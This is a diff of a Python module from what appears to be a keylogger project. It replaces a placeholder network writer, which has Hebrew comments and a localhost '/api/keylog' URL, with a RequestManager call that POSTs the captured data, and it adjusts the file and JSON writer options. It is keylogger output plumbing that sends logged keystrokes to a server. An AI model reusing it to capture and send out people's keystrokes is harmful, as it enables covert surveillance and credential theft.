@@ -1,11 +1,12 @@
 import json
 import os
 from abc import ABC, abstractmethod
+from api_server import RequestManager
 
 
 class Writer(ABC):
     @abstractmethod
-    def Writes_to_file(self, data: dict):
+    def Writes(self, data: dict):
         pass
 
 
@@ -35,18 +36,16 @@ class FileWriter(Writer):
 
 
 class NetworkWriter(Writer):
-    def __init__(self, server_url="http://localhost:5000/api/keylog"):
-        self.server_url = server_url
+
+    def __init__(self):
+        self.app_server = RequestManager()
 
     def Writes(self, data: dict):
         """
         שליחת נתונים לשרת
         """
-        # כאן יש לממש את הלוגיקה לשליחת הנתונים לשרת
-        # לדוגמה:
-        # response = requests.post(self.server_url, json=data)
-        # return response
-        print(f"Sending data to server: {self.server_url}")
+        self.app_server.handle_request(method = "POST",request_type="data",kwargs= data)
+        print(f"Sending data to server")
         return data
 
 class Write_keys:
@@ -56,7 +55,7 @@ class Write_keys:
         self.networkWriter = NetworkWriter()
 
     def handle_write(self,write_to,data):
-        if write_to == "file":
+        if write_to == "json":
             self.fileWriter.Writes(data)
         elif write_to == "network":
             self.networkWriter.Writes(data)
